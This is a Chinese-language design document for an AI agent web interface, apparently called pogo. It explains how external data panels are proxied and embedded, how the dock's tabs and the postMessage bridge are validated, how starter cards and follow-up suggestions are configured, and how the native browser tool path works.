**files-only 之后前端不重连 stream。** transcript 没动，重连只会拿回一份和屏幕上一样的快照；也不会把原文塞回输入框，因为没有消息被撤回。只失效文件相关的两个 epoch（树与 quick-open 索引），然后浮一条说明「已恢复 N 个文件，对话未改动」。

---

## 19. 外部面板（-web-panel）与 dock sheet 化

场景应用（如恶意代码分析平台）需要自己的数据页面，而基座的 UI 不该长领域页面。业界 2025–2026 的收敛答案（ChatGPT Apps SDK / MCP Apps 官方扩展 / VS Code webview）：**宿主从不实现领域 UI，它提供通用的展示槽**——沙箱 iframe + 同源反代。pogo 的实现：

**注册与代理。** `-web-panel 名称=url`（可重复）在启动时注册，经校验（名称不含 `/=`、URL 必须绝对 http(s)）。服务器挂两条路由：`GET /api/panels`（只报名字和 `/panels/<名称>/` 路径，后端 URL 不外泄——内部拓扑是服务器自己的事）和 `/panels/{name}/*` 的反向代理（`Rewrite` 剥前缀，裸 `/panels/<名称>` 301 到带斜杠，让相对链接落在前缀下）。代理模式复用 `-web-dev` 那套单源思路：面板与页面同源，Origin 中间件天然覆盖，不开 CORS。启动注册之外还有**运行时注册**：新标签页添加跨源快捷方式时，对话框默认勾选「经内置反代同源打开」，即 `POST /api/panels`（token 门禁继承 `/api` 前缀中间件；按 URL 幂等；名称从卡片标题推导，非法字符转 `-`，冲突加 `-2` 后缀，无标题用主机名）——代理映射表加锁可变，`/panels/{name}` 本就是通配路由按名查表。运行时注册持久化到 `<状态根>/panels.json`（`POGO_PANELS_FILE` 可改），重启重放；与旗标重名时旗标赢。

**鉴权边界（与页面同一套理由）。** 面板内容**不过** token——页面和静态资源也不过，因为它们都是内容而非操作；`/api/panels` 过，因为它是 `/api`。两条推论写进了 `Panel` 的 doc：面板后端有写操作就自己做鉴权；只注册可信后端——同源 iframe 能读到父页面 URL 里的 token，所以这把注册旗标和 `-skill` 一样是运营者的显式信任决定。

**dock 从双排改成 sheet 容器。** 原「文件在上、shell 在下（或左右）」的双栏模型退役，换成常显的 40px 图标栏 + 一次只显示一个 sheet，点当前图标收起。旧 localStorage（`pogo:files-open`/`shell-open`）一次性迁移到 `pogo:active-sheet`；几何键后来也换过一次：像素宽度 `pogo:files-width` 已被拆分比例 `pogo:files-ratio` 取代（旧键被主动删除；比例才能在侧栏收起、窗口缩放时保住布局）。

**图标栏固定为三颗（v3；v2 是两颗）。** 第一版让每个注册的面板各占一颗图标，结果 rail 上「文件」「Shell」和一个四页数据应用并列——前两者是**运行时自身的状态**（agent 在哪干活、它跑的命令长什么样），后者是**领域内容**，分类错了，所以看着违和。修正后 rail 是 chrome，恒定三颗：

- **文件**保留独立按钮——高频、长驻、要和对话并排看，降级进容器会给最常用的操作多加一次点击；
- **面板**是一个容器（`hub`），Shell、每个 `-web-panel`、每个打开的子运行 transcript、自由浏览页签（`browser:<n>`）都是它的**住户**，由标题栏的 **tab strip** 切换。注册再多面板也不会改变 rail；
- **技能与工具**（v3）是 skill 的管理面：按技能/按工具两个视角（分段控件，同一目录数据的两种排序）、skill 的存放路径、每个 skill 的 `tools.json` 声明的工具（徽章即审批待遇：只读免审、破坏性必审、仅目录不可直调）、参数表，以及从旧设置抽屉继承来的 SKILL.md 只读查看器。原侧栏底部的设置按钮随之退役——skill 展示搬进了 dock（它是工作区上下文，和文件树同类，不是主题/语言那种窗口偏好）。数据来自 `/api/skills`（含每个 skill 的工具）与 `/api/tools`（平铺目录）。

这是浏览器侧边栏模型而不是 VS Code 活动栏模型：rail 恒定三颗，不随内容增长。hub 内部的住户切换最初是标题栏左侧的下拉，**后改为浏览器式 tab strip**（`dockSheets.ts` 的注释记了弃用下拉的理由）：下拉把「哪个住户在台上、哪些子运行还在跑」恰好全藏起来，而 strip 正是一眼展示这些的控件——opencode 和 Claude Code 的 tab 请求里能读到这种抱怨长什么样。代价是单颗按钮丢了一眼可辨的身份，缓解办法三条：收起时显示通用面板图标、展开时改为显示当前住户的图标（收起状态下会变的图标会让人以为按钮每天干不同的事）、tooltip 带住户名。

状态是 `pogo:active-sheet`（`files` / `hub` / `skills`）加 `pogo:hub-tabs`（tab 列表 + 活跃 tab；旧键 `pogo:hub-tenant` 只作迁移读取）。tab id 四种：`shell` / `panel:<名称>` / `subagent:<子会话 id>` / `browser:<n>`。`migrateSheet` 把历史上写过的每个值都折叠到这三个 sheet 上，并且**幂等**——降级再升级不会把人卡在一个不存在的 sheet 上；来自更新版本的未知值一律开不开任何 sheet，因为收起状态从 rail 就能恢复，而猜测会打开用户没选过的东西。记不住的 tab（某个 `-web-panel` 从命令行去掉了）恢复时丢弃，活跃 id 失效就回落到第一个住户，不留空白面板。

hub 标题栏还有一颗**最大化**：force graph 或宽表格值得临时占满宽度。它是对「对话区永不低于一半」那条硬下限的显式临时覆盖，只在 hub 生效，且**不持久化**——下次启动出现一个盖住对话又没有解释的面板，比多按一次键糟得多；切走 sheet 时自动清除。

**postMessage 桥（v2 已实现）。** 面板→对话的联动落地了：面板发一条消息，pogo 把文本填进输入框。线上格式直接用 **MCP Apps（SEP-1865）的 `ui/message`**——JSON-RPC 2.0 over postMessage，`params.content = {type:"text", text}`。选标准而不是自造，是因为这套东西正是为「iframe 里的界面和宿主对话」设计的，ChatGPT 的 Apps SDK 也说同一种话；将来真要长成 MCP Apps host，面板那一侧不用改。带 `id` 的请求会收到 `{result:{}}` 回执。

监听最初放在 `DockArea`，iframe 搬家后**已迁至 `BrowserPane`**（四条校验原样跟过去），因为两条要紧的校验都需要 iframe 元素本身：

1. `event.origin` 必须等于本页 origin——面板是同源反代进来的，别处来的就不是面板；
2. `event.source` 必须是这个 iframe 的 `contentWindow`——只看 origin 会把页面自己和任何其他同源 frame 也放进来；面板没开就没有桥，失败即关闭；
3. 载荷当不可信数据：只取 `content.text`，永不变成标记；
4. 回执写明目标 origin，不用 `*`；
5. 方法白名单只认 `ui/message`，`role` 不是 `user` 一律拒绝——不让面板替 assistant 说话。未知方法打一条 warn，但 `not-rpc` 静默，因为同源页面本来就有大量无关的 postMessage 流量（vite、xterm、扩展）。

要说清楚这几条防的是什么：面板跑在页面的 origin 里，本来就被信任到「能拿到这个页面持有的 token」那种程度，所以校验**不是**让一个恶意面板变安全，而是让一个**无关的 frame** 没法替面板说话。真要托管不可信面板，得按 MCP Apps 规范换独立沙箱源——那正是同源反代这条路刻意不去做的事。

**策略与解析分离。** 桥只产出意图，怎么落地由 `composerIntent` 决定：面板意图**永远只填入、绝不代发**。理由是 pogo 自己的立场——面板是内容，服务端连 token 都不要求它带；能自己花掉一次模型调用的内容，就不再是内容了。填入时若 hub 正最大化会自动还原，否则用户会填进一个看不见的输入框。

**什么不在这里面：** ~~subagent 事件 sheet 化~~ **已实现**——子运行卡片上的锚点在 hub 里开一个 `subagent:<子会话 id>` tab 看子运行 transcript（同一子运行点两次只聚焦既有 tab，数据来自 `GET /api/sessions/{sid}/transcript` 的轮询）；侧边聊天（在 hub 里开第二个并行会话）需要把对话区抽成可复用组件，且业界经验表明窄面板里的多聊天 tab 是问题高发区，所以定位为单实例、不做 tab，单独排期。

---

## 20. 空态引导与后续建议（starters.json）

空对话是通用 agent 和其他所有 agent 长得最像的一屏：一个空输入框同时表达「无限可能」和「零方向」。而 rail 归了 chrome 之后，**领域的门面就该落在这里**——它按会话重来、与上下文相关、天然承担「这个 agent 能替我做什么」。

**内容由部署方给，不写进 UI。** pogo 不认识恶意代码，也不该认识。卡片来自 skill 目录里的 `starters.json`，与「领域性只在 skill」一致，还跟着 skill 一起版本化、一起用 `-v` 挂载迭代。没有 skill 提供时，空态回退到原来那行 hint，裸 pogo 零回归。

**每请求重读**，所以改完 `starters.json` 刷新页面即生效——和 `/skill:name` 重读指令是同一个理由。文件很小，且这个接口一次页面加载只取一次。

**动词只有两个**：`prompt`（把文本放进输入框）和 `panel` + 可选 `at`（打开某个 dock 面板，可带 hash 路由）。词汇表保持这么小，是为了不让 `starters.json` 长成一门驱动 UI 的语言。

**字段形态抄了成熟做法**：`title` + `label` + `prompt` 的三段结构、「点击是填入还是直接发送」由配置决定，都是 suggestion API 已经收敛的答案（assistant-ui 的 Suggestions、Custom GPT 的 conversation starters、Copilot Studio 的 suggested prompts）。数量上限 27 张（`skills.MaxStarterCards`，超出告警并忽略）。`send` 默认 **false**：pogo 别处的规则是从不替用户说话（编辑消息是回填而不是重发），想要一键演示的部署显式打开。

**校验在加载时就报，不在运行时沉默。** 未知字段直接判文件不合法——把 `cards` 拼成 `prompts` 会渲染出一张什么都不做的卡片，而作者根本分不清是自己拼错还是 UI 有 bug。逐卡片的规则：标题必填且有长度上限、两个动作互斥、`icon` 必须来自白名单（否则等于让一个 JSON 文件递交页面标记）、`at` 必须以 `#/` 开头。坏卡片逐张跳过并各自说明原因，好卡片照常显示；整份文件坏掉就退回内置 hint——一个坏文件应该只损失一个特性，不该损失整页。

`prompt` 不能是 slash command：那道防线防的是一行注入关掉审批门，与文件是谁写的无关。`/skill:name` 是例外，它是会展开的提示而不是会执行的命令。面板名是否真的注册过由 web 层核对（skills 包不知道有哪些面板），点了没反应的按钮比少一张卡更糟——旗标注册与运行时注册（panels.json）都算数。

编辑器顺着这条校验做成了**只选不填**：对话框的面板名是注册面板的下拉（`GET /api/panels`），不提供手输——能打字的地方就能写出一张保存即被跳过的死卡；列表为空时「面板」动作直接禁用。`at` 深链留在 schema 里（JSON 导入照常可用），对话框不提供这个格子：需要一个路由的人才写得出路由，让他们走导入。

**后续建议（followups）** 有两个来源，按优先级：**生成式为主**——一轮结束后服务端用一次异步模型调用预测用户接下来最可能问的追问，作为 `followups` 事件推给客户端并折进 snapshot（整页刷新也能恢复）；最多 8 条，prompt 要求尽量给满、实在没有更多有价值的问题时可以少给，但绝不为凑数硬造。这次调用在回答渲染完之后才开始，所以永远不会拖累它所要建议的那个回答。同一个 `starters.json` 文件里的规则组是**兜底**：生成被关掉（`-followups=false`）、调用失败、或模型判断「这里沉默是对的」（寒暄、报错、一次性事实回答）时，由 `when` 匹配接管的 chips。

规则兜底这一半的两个决定仍然成立，都是为了不烦人：

1. **确定性兜底，零延迟零花费。** skill 声明条件，匹配是一次字符串查找。生成那一半也不是每轮都一定有产出：模型被明确要求在没把握时返回空数组，而解析失败一律静默——前端自然落回规则匹配。
2. **相关才显示，否则沉默。** `when` 只匹配**最后一轮**做了什么（工具调用名 + 参数 + 回复文本，拼起来截断并小写）。只看最后一轮是因为放到整段对话上，一个命令出现过一次就会一直匹配，chips 就不再描述刚刚发生的事。没命中就什么都不显示——固定一排 chips 会在用户刚问完家族画像时建议「反编译它」，而一半时间不对的建议会训练用户忽略这一行。

所有命中的组**合并去重**（同义不同题、同题不同名都算同一条建议），至多 8 条（`skills.MaxFollowupChips`）；一轮跑了两个命令就关乎两件事，命中第一组即停会把另一半的下一步藏起来。文件顺序仍是作者的优先级声明——靠前的组先进 chip 行。运行中和有审批门等待时都不显示：让建议和审批卡同屏，等于要求用户同时做两件事，而其中一件正卡着 agent。

## 21. 浏览器工具（原生单一路径）

当前链路是 `Agent → browser → BrowserGate → Go 会话桥 → 私有 worker → Chromium`。页面动作、CDP、截图与人工接管共享会话；前端只显示画面和传递明确的人工输入，不承担 Agent 执行。没有 SSE 订阅者仍可执行；服务缺失或故障明确不可用，没有 iframe 回退。

任务授权仍由 BrowserGate 按 run 管理：browser-task Skill 或主会话首次浏览器调用的批准开启本轮操作，结束后收回；子 Agent 继承同一闸门与执行器，不另开后端，继续遵守串行租约。后端能力元数据不授予权限。

旧 browser_request 事件、前端执行器注册表、browser_result 结果回填、同源 DOM 注入和 pick-data 钩子已退役。旧 browser_result 请求只返回 410，不能完成任何在途原生操作。`eval`、`auth_status`、`api_read` 不再是工具动作；JavaScript 使用 `devtools/Runtime.evaluate`，登录由浏览器与网站维护，Network 读取不补发请求。

外层 Dock 只保留一个浏览器视图，真实网站页签由内部 Chromium 管理。旧页签和书签先备份再迁移到原始网址，未解析条目保留待修复入口。文件、PDF 和引用预览保留。动作、错误恢复与迁移的完整契约见 [原生运行时](native-browser-runtime.md)、[调试协议](browser-devtools.md) 和 [单一路径迁移](browser-native-only.md)。
